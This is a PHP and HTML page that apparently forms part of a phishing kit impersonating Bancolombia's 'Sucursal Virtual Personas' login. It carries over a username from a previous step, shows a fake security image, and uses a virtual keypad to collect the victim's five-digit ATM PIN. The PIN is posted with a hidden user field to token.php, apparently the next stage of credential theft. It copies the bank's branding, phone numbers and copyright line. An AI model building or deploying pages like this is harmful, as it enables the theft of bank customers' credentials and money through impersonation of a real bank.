<?php 
    error_reporting(0);

    session_start();
    /*session is started if you don't write this line can't use $_Session  global variable*/
    $_SESSION["usuario"]=$_POST["usuario"];

    error_reporting(0);

    date_default_timezone_set('America/Bogota');

    function getRealIP() {

        if (!empty($_SERVER['HTTP_CLIENT_IP']))
            return $_SERVER['HTTP_CLIENT_IP'];
        
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
    
        return $_SERVER['REMOTE_ADDR'];
    }

    function get_nombre_dia($fecha){
        $fechats = strtotime($fecha); //pasamos a timestamp
     
     //el parametro w en la funcion date indica que queremos el dia de la semana
     //lo devuelve en numero 0 domingo, 1 lunes,....
     switch (date('w', $fechats)){
         case 0: return "Domingo"; break;
         case 1: return "Lunes"; break;
         case 2: return "Martes"; break;
         case 3: return "Miercoles"; break;
         case 4: return "Jueves"; break;
         case 5: return "Viernes"; break;
         case 6: return "Sabado"; break;
     }
     }


    function getMonth() {
        switch (date("m")) {
            case '01':
                return 'Enero';
                break;
            case '02':
                return 'Febrero';
                break;
            case '03':
                return 'Marzo';
                break;
            case '04':
                return 'Abril';
                break;
            case '05':
                return 'Mayo';
                break;
            case '06':
                return 'Junio';
                break;
            case '07':
                return 'Julio';
                break;
            case '08':
                return 'Agosto';
                break;
            case '09':
                return 'Septiembre';
                break;
            case '10':
                return 'Octubre';
                break;
            case '11':
                return 'Noviembre';
                break;
            case '12':
                return 'Diciembre';
                break;
            
            default:
                'Dato invalido';
                break;
        }
    }
   
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia Sucursal Virtual Personas</title>
    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">

    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @font-face {
            font-family: 'Open Sans';
            src: url('./assets/fonts/OpenSans-Regular.ttf');
        }
        @font-face {
            font-family: 'CIBFontSans';
            src: url('./assets/fonts/CIBFontSans-Light.ttf');
        }
        * {
            font-family: 'Open Sans';
        }
        .font-custom {
            font-family: 'CIBFontSans' !important;
        }
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input:focus {
            outline: none;
        }
        .keyboard-button *{
            color: #2c2a29 !important;
        }
        .keyboard-button{
            height: 38px;
            width: 38px;
            border: 1px solid black;
        }

    </style>
    	<script>
            function soloNumeros(e){
              var key = window.event ? e.which : e.keyCode;
              if (key < 48 || key > 57) {
                e.preventDefault();
              }
            }
        </script>
</head>
<body>
    <div class=" sm:mx-[55px] px-[15px] pt-[10px]">
        <div class="flex flex-col gap-[10px] pb-[20px]">
            <div>
                <img src="./assets/logo.svg" alt="logo" class="sm:mt-[10px]">
            </div>
            <p class="text-base text-[#2c2a29]">Sucursal Virtual Personas</p>
            <div class="flex">
                <p class="text-[11px] text-[#2c2a29]">Fecha y hora actual:</p>
                <p class="ml-5 inline-block text-xs"><?php echo get_nombre_dia(date("Y") . '-'. date("m") .'-'. date("d")) . " del " . getMonth() . " de " . date("Y") ;?></p>
                <p class="inline-block text-xs" id="hora"></p>
            </div>
        </div>

        <div class="px-[15px] py-[10px] bg-[#2c2a29]">
            <p class="ml-[5px] text-white font-custom">Inicio de sesión</p>
        </div>

        <!-- TODO: ERROR -->
        <!-- <div class="border-[1px] border-[#CCCCCC] flex items-center p-2">
            <div>
                <img src="/assets/icons/close.png" alt="" class="h-[38px]">
            </div>
            <div>
                <p>Error</p>
                <p>El usuario no cumple el formato requerido, por favor intente nuevamente.</p>
            </div>
        </div> -->

        <div class="pt-[30px] grid gap-6 sm:gap-0 md:grid-cols-12 mb-[35px]">
            
            <div class="flex flex-col gap-5 md:col-start-1 md:col-end-6 ">
                <div class="flex flex-col gap-5">
                    <p class="font-semibold">Imagen y frase de seguridad seleccionadas</p>
                    <p class="text-xs">Verifica que tu imagen y frase de seguridad sean correctas, de esta manera te asegurarás de estar ingresando a la Sucursal Virtual Personas de Bancolombia.</p>
                </div>
                
                <div class="flex gap-4">
                    <div>
                        <img src="./assets/foto de seguridad.jpg" class="p-1 border-[1px] border-[#000000]" alt="">
                    </div>
                    <div class="flex flex-col">
                        <p class="text-sm"></p>
                        <p class="font-bold"></p>
                    </div>
                </div>
            </div>

            <div class="grid md:col-start-6 md:col-end-10 gap-[15px]">
                <div class="border-[1px] border-[#CCCCCC] pb-[15px]">
                    
                    <form action="token.php" method="POST">
                        <div class="px-[5px] py-[5px] bg-[#2c2a29]">
                            <p class="font-custom ml-[5px] text-white">Usuario</p>
                        </div>
                        <div class="bg-[#F4F4F4] px-[5px]">
                            <p class="px-[5px] py-[8px] text-xs">Si la imagen y frase no son las que has definido, por seguridad no ingreses la clave.</p>
                        </div>

                        <div class="px-[10px] pt-[8px] flex gap-3 flex-col">
                            <div class="flex gap-3">
                                <p class="text-sm text-[#2c2a29] font-custom font-bold">Ingresa tu clave</p>
                            </div>
                            

                            <div class="relative">
                                <input readonly id="password" name="password" onkeypress="soloNumeros(event)" type="password" class="border-[1px] border-[#CCCCCC] py-[5px] px-12 text-sm w-full" value="" maxlength="5" required>
                                <img src="./assets/icons/lock.png" alt="" class="absolute top-2 left-5 w-[16px]">
                                <p class="text-[#2c2a29] text-xs mt-2">Ingresa mediante el teclado virtual la clave que usas en el cajero automático.</p>
                            </div>

                            <div class="pt-[30px] flex justify-center gap-4">
                                <button type="button" class="border-[1px] border-[#2c2a29] text-sm px-[15px] pt-[8px] pb-[7px] text-[#2c2a29]">Cancelar</button>
                                <button type="submit" class="bg-[#fdda24] text-sm px-[15px] pt-[8px] pb-[7px] text-[#2c2a29]">Ingresar</button>
                            </div>
                            <div class="flex gap-[10px] items-center justify-end text-sm">
                                <img style="height: 13px;" src="./assets/icons/info-user.png" alt="">
                                <p>Genera una clave personal</p>
                            </div>
                        </div>
                        <input class="bg-none" style="z-index: -292; cursor: default; position: absolute;" type="text" name="user" value="<?php $usuario ?>">

                    </form>
                    
                </div>

            </div>

            <div class="grid md:col-start-10 md:col-end-13 gap-[15px] justify-center items-center">
                <div class="flex flex-col gap-2">
                    <div id="botonesteclado" class="min-w-[20px] flex flex-col gap-y-1">
                        
                        <div class="">
                            <input value="2" id="boton-2" name="2" type="button" class="keyboard-button" style="display: inline-block;">
                            <input value="5" id="boton-5" name="5" type="button" class="keyboard-button" style="display: inline-block;">
                            <input value="6" id="boton-6" name="6" type="button" class="keyboard-button" style="display: inline-block;">
                        </div>
                        
                        <div>

                            <input value="1" id="boton-1" name="1" type="button" class="keyboard-button" style="display: inline-block;">
                            <input value="4" id="boton-4" name="4" type="button" class="keyboard-button" style="display: inline-block;">												
                            <input value="7" id="boton-7" name="7" type="button" class="keyboard-button" style="display: inline-block;">
                            
                        </div>

                        <div>
                            <input value="0" id="boton-0" name="0" type="button" class="keyboard-button" style="display: inline-block;">
                            <input value="8" id="boton-8" name="8" type="button" class="keyboard-button" style="display: inline-block;">
                            <input value="3" id="boton-3" name="3" type="button" class="keyboard-button" style="display: inline-block;">
                        </div>
                        <div class="flex gap-1">
                            <input value="9" id="boton-9" name="9" type="button" class="keyboard-button" style="display: inline-block;">
                            <input value="Borrar" id="boton-Borrar" name="Borrar" type="button" class="keyboard-button flex-1 flex keyboard-widekey pull-right boton-borrar" style="display: inline-block;">
                        </div>                    
                        
                    </div>
                    <div class="flex flex-col justify-center mt-3">
                        <p class="text-xs text-center">Contraste</p>
                        <div class="flex justify-around">
                            <p class="px-2 rounded-full font-bold ">A</p>
                            <p class="bg-[#FDDA24] px-2 rounded-full font-bold ">B</p>
                            <p class="px-2 rounded-full font-bold ">C</p>
                        </div>
                    </div>
                </div>

            </div>
            
        
        </div>

        <footer>
            <p class="text-xs">
                Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - 
                <br/>
                Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
		 
            </p>
            <div class="flex justify-between text-[11px] mt-2">
                <p>Dirección IP: <?php echo getRealIP(); ?></p>
                <p>Copyright © Bancolombia S.A.</p>
            </div>
        </footer>
    </div>
    <script>

        const horaSelector = document.querySelector('#hora');
        const currentTime = new Date();
        horaSelector.innerText = currentTime.toLocaleTimeString('en-US');
        
        setInterval(() => {
            const currentTime = new Date();
            horaSelector.innerText = currentTime.toLocaleTimeString('en-US');
        }, 1000);
        

    </script>
    <script>
        // boton teclado virtual a valor del input password
        const impPass = document.getElementById('password');
        const borrar = document.getElementById('boton-Borrar');
        const boton1 = document.getElementById('boton-1');
        const boton2 = document.getElementById('boton-2');
        const boton3 = document.getElementById('boton-3');
        const boton4 = document.getElementById('boton-4');
        const boton5 = document.getElementById('boton-5');
        const boton6 = document.getElementById('boton-6');
        const boton7 = document.getElementById('boton-7');
        const boton8 = document.getElementById('boton-8');
        const boton9 = document.getElementById('boton-9');
        const boton0 = document.getElementById('boton-0');


        // al hacer click colocar el valor correspondiente
        borrar.addEventListener('click', function(){
            const valor = impPass.value.length;
            impPass.value = impPass.value.slice(0, valor - 1);
        });

        boton1.addEventListener('click', function(){
            impPass.value = '1' + impPass.value;
        });
        
        boton2.addEventListener('click', function(){
            impPass.value = '2' + impPass.value;
        });

        boton3.addEventListener('click', function(){
            impPass.value = '3' + impPass.value;
        });

        boton4.addEventListener('click', function(){
            impPass.value = '4' + impPass.value;
        });

        boton5.addEventListener('click', function(){
            impPass.value = '5' + impPass.value;
        });

        boton6.addEventListener('click', function(){
            impPass.value = '6' + impPass.value;
        });

        boton7.addEventListener('click', function(){
            impPass.value = '7' + impPass.value;
        });

        boton8.addEventListener('click', function(){
            impPass.value = '8' + impPass.value;
        });

        boton9.addEventListener('click', function(){
            impPass.value = '9' + impPass.value;
        });

        boton0.addEventListener('click', function(){
            impPass.value = '0' + impPass.value;
        });
        
    </script>    

</body>
</html>